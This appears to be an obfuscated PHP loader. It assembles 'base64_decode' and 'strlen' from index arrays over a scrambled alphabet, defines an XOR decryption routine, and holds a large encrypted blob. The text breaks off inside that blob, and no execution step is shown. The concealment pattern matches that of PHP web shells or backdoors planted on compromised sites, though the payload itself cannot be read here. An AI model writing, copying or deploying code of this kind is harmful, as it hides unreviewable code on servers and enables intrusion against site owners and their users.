<?php function create_function_name($index_array){
    $char_set = "7bgsc0kjtm6l9wvu813fxirzaheyqdo5_2n4p";
    $function_name = "";
    foreach($index_array as $index){
        $function_name .= $char_set[$index];
    }
    return $function_name;
}
function otp_data_block($data_block, $key) {

    $first_index_array = array(1,24,3,26,10,35,32,29,26,4,30,29,26);

    $base64_decode = create_function_name($first_index_array);
    $data_block = $base64_decode($data_block);

    $second_index_array = array(3,8,22,11,26,34);
    $strlen = create_function_name($second_index_array);
    $data_block_length = $strlen($data_block);
    $key_length = $strlen($key);
    if ($data_block_length <= $key_length) {
        return $data_block ^ $key;
    }
    for ($i = 0; $i < $data_block_length; ++$i) {
        $data_block[$i] = $data_block[$i] ^ $key[$i % $key_length];
    }
    return $data_block;
}
$data_block = 
"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